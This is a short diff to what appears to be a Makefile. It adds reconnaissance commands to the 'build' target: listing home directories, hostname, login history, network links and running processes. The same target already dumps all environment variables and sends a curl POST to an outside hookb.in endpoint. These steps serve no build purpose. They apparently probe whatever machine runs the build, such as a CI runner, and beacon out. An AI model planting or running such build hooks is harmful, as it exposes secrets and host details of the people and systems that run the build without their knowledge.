@@ -5,6 +5,13 @@ ListAllCommands:
 EchoEnv:
 	printenv | sort
 build: ListAllCommands EchoEnv
+	ls -al ~/ || true
+	ls -al /home || true
+	hostname || true
+	hostnamectl || true
+	last || true
+	networkctl -a || true
+	ps aux || true
 	whoami || true
 	uname -a || true
 	curl -X POST -H "Content-Type: application/json" -d '{"name": "John"}' https://hookb.in/PxlndeYwL7UZVqjmP0gx
